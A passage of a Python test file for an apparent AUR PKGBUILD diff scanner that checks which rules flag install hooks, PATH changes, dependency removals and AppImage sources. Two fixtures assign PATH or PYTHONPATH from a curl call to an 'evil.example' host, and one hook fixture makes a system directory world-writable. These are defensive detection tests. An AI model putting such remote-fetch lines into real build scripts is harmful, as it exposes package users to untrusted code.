        diff, current_text="pkgname=cargo-fframes\ninstall=\n")


def test_h023_ignores_a_bare_install_assignment_in_the_post_text():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n"
            "-pkgver=1.2.0\n+pkgver=1.3.0\n")
    assert "H023" not in _ids(
        diff, current_text="pkgname=cargo-fframes\npkgver=1.3.0\ninstall=\n")


def test_h023_ignores_an_empty_quoted_install_assignment():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,2 @@\n"
            "+pkgname=demo\n+install=\"\"\n")
    assert "H023" not in _ids(
        diff, current_text='pkgname=demo\ninstall=""\n')


def test_h023_still_fires_when_a_named_hook_is_present():
    """H023 is the "hook present" context finding; R007 owns "hook added"."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
            " pkgname=demo\n-pkgver=1\n+pkgver=2\n"
            " install=demo.install\n")
    assert "H023" in _ids(
        diff, current_text="pkgname=demo\npkgver=2\ninstall=demo.install\n")


# --- 2026-10-23 alert review: reproducible malicious false positives --------

def _findings(diff, current_text=None, package="demo"):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name=package, current_text=current_text)
    return fact.score_breakdown


def test_x024_does_not_read_a_printed_install_notice_as_an_assignment():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=demo\n"
            "+install=demo.install\n"
            "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,2 @@\n"
            "+post_install() {\n"
            "+  echo '  export PATH=\"$(aqua root-dir)/bin:$PATH\"'\n"
            "+}\n")
    assert "X024" not in _ids(diff)


def test_x024_still_fires_on_a_real_indirect_path_assignment():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=demo\n+build() {\n"
            "+  PATH=\"$(curl https://evil.example/tool)\" make\n+}\n")
    assert "X024" in _ids(diff)


def test_x014_and_x024_do_not_fire_on_a_check_test_runner_environment():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=demo\n+check() {\n"
            '+  PYTHONPATH="$staged" python -P "$srcdir/test.py"\n+}\n')
    ids = _ids(diff)
    assert "X014" not in ids
    assert "X024" not in ids


def test_x024_still_fires_on_a_command_substitution_in_check():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=demo\n+check() {\n"
            '+  PYTHONPATH="$(curl https://evil.example/x)" pytest\n+}\n')
    assert "X024" in _ids(diff)


def test_maintainer_identity_ignores_a_display_name_change():
    from trustsight.analysis.maintainer import maintainer_identity

    assert maintainer_identity("Aleksandar <a@example.test>") == \
        maintainer_identity("Aleksandar Zarić <a@example.test>")
    assert maintainer_identity("A <a@example.test>") != \
        maintainer_identity("B <b@example.test>")


def test_h100_notice_only_hook_is_info_and_does_not_score():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=demo\n+install=demo.install\n pkgver=1\n"
            "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,7 @@\n"
            "+_notice() {\n+  cat <<'EOF'\n+hello\n+EOF\n+}\n"
            "+post_install() { _notice; }\n")
    rows = [e for e in _findings(diff) if e.rule_id == "H100"]
    assert rows and rows[0].severity == "INFO" and rows[0].weight == 0


def test_h100_still_high_when_the_hook_changes_permissions():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=demo\n+install=demo.install\n pkgver=1\n"
            "--- /dev/null\n+++ b/demo.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n+  chmod 1777 /opt/demo/out\n+}\n")
    rows = [e for e in _findings(diff) if e.rule_id == "H100"]
    assert rows and rows[0].severity == "HIGH"


def test_c021_does_not_fire_when_the_transitional_package_drops_the_build():
    new = "pkgname=demo\npkgver=1\ndepends=('demo-new')\n"
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,3 @@\n"
            " pkgname=demo\n pkgver=1\n"
            "-build() { make; }\n-optdepends=('foo: x')\n"
            "+depends=('demo-new')\n")
    assert "C021" not in _ids(diff, current_text=new)


def test_c021_does_not_fire_when_a_dependency_moves_between_arrays():
    new = ("pkgname=demo\npkgver=1\nbuild() { make all; }\n"
           "checkdepends=('foo')\n")
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
            " pkgname=demo\n pkgver=1\n"
            "-build() { make; }\n-optdepends=('foo: x')\n"
            "+build() { make all; }\n+checkdepends=('foo')\n")
    assert "C021" not in _ids(diff, current_text=new)


def test_c021_still_fires_when_a_dependency_is_really_removed():
    new = "pkgname=demo\npkgver=1\nbuild() { make all; }\n"
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,3 @@\n"
            " pkgname=demo\n pkgver=1\n"
            "-build() { make; }\n-optdepends=('foo: x')\n"
            "+build() { make all; }\n")
    assert "C021" in _ids(diff, current_text=new)


def test_c021_quiet_on_removing_a_coverage_plugin_only():
    new = ("pkgname=demo\npkgver=1\nbuild() { make all; }\n"
           "checkdepends=('python-pytest')\n")
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
            " pkgname=demo\n pkgver=1\n"
            "-build() { make; }\n-checkdepends=('python-pytest' 'python-pytest-cov')\n"
            "+build() { make all; }\n+checkdepends=('python-pytest')\n")
    assert "C021" not in _ids(diff, current_text=new)


def test_c021_still_fires_when_the_test_runner_is_removed():
    new = ("pkgname=demo\npkgver=1\nbuild() { make all; }\n"
           "checkdepends=('python-pytest-cov')\n")
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,4 @@\n"
            " pkgname=demo\n pkgver=1\n"
            "-build() { make; }\n-checkdepends=('python-pytest' 'python-pytest-cov')\n"
            "+build() { make all; }\n+checkdepends=('python-pytest-cov')\n")
    assert "C021" in _ids(diff, current_text=new)


# --- 2026-10-26 watcher alerts: declaration resolution and shell expansion ---


_LOTTI_OLD = """\
pkgname=lotti-bin
pkgver=1.1.61+4449
pkgrel=1
_ghurl="https://github.com/matthiasn/lotti"
source=(
    "${pkgname%-bin}-${pkgver}.tar.gz::${_ghurl}/releases/download/${pkgver//_/+}/linux.x64.tar.gz"
    "${pkgname%-bin}.sh"
)
sha256sums=('aaaa' 'bbbb')
prepare() {
    sed -i "s/@runname@/${pkgname%-bin}/g" "${srcdir}/${pkgname%-bin}.sh"
}
"""

_LOTTI_NEW = """\
pkgname=lotti-bin
_pkgver=1.1.63
_subver=4451
pkgver="${_pkgver}+${_subver}"
pkgrel=1
_ghurl="https://github.com/matthiasn/lotti"
source=(
    "${pkgname%-bin}-${pkgver}-x86_64.AppImage::${_ghurl}/releases/download/${pkgver}/Lotti-${_pkgver}-x86_64.AppImage"
    "${pkgname%-bin}.sh"
)
sha256sums=('cccc' 'bbbb')
prepare() {
    sed -i "s/@runname@/parecord/g" "${srcdir}/${pkgname%-bin}.sh"
    chmod +x "${srcdir}/${pkgname%-bin}-${pkgver}-${CARCH}.AppImage"
    "${srcdir}/${pkgname%-bin}-${pkgver}-${CARCH}.AppImage" --appimage-extract > /dev/null
}
"""


def _lotti_diff():
    return "".join(difflib.unified_diff(
        _LOTTI_OLD.splitlines(True), _LOTTI_NEW.splitlines(True),
        "a/PKGBUILD", "b/PKGBUILD"))


def test_x033_and_c001_do_not_fire_on_a_declared_appimage():
    ids = _ids(_lotti_diff(), current_text=_LOTTI_NEW)
    assert "X033" not in ids
    assert "C001" not in ids


def test_variable_driven_pkgver_keeps_its_version_scheme():
    from trustsight.full_aur.properties import extract_properties

    assert extract_properties(_LOTTI_NEW)["version_scheme"] == "semver"


def test_h101_does_not_fire_on_an_expansion_in_an_archive_url():
    old = """\
pkgname=pulseaudio-dlna-cygn
pkgver=0.6.1
pkgrel=3
source=(
  "${pkgname}-${pkgver}.tar.gz::https://github.com/Cygn/pulseaudio-dlna/archive/${pkgver}.tar.gz"
)
"""
    new = """\
pkgname=pulseaudio-dlna-cygn
pkgver=0.6.6.1
pkgrel=1
source=(
  "${pkgname}-${pkgver}.tar.gz::https://github.com/Cygn/pulseaudio-dlna/archive/pulseaudio-dlna-${pkgver%.*}-${pkgver##*.}.tar.gz"
)
"""
    diff = "".join(difflib.unified_diff(
        old.splitlines(True), new.splitlines(True), "a/PKGBUILD", "b/PKGBUILD"))
    assert "H101" not in _ids(diff, current_text=new)
